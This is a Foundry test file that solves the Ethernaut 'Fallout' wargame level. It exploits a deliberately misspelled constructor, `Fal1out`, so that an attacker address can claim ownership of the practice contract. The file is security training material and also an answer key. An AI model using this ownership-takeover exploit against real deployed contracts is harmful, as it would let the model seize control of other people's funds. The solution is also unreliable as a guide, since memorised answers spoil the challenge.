/*
* Don't look at the solution without trying yourself first!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import { Test, console } from "forge-std/Test.sol";
import { Fallout } from "@src/02-Fallout/Fallout.sol";

contract HackFallout is Test {
    address public deployer;
    address public attacker;
    Fallout public falloutContract;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        vm.prank(deployer);
        falloutContract = new Fallout();
    }

    function testClaimOwnership() public {
        // hack the contract
        // your code goes here

        // in solidity version ^0.6.0, the contructor has the same name as that of the contract
        // thus, `Fallout` contract's constructor should be named `Fallout`
        // however, in this case, the constructor is misspelled to `Fal1out`
        // this allows an attacker to invoke it and set themself as the owner
        vm.prank(attacker);
        falloutContract.Fal1out();

        assertEq(falloutContract.owner(), attacker);
    }
}
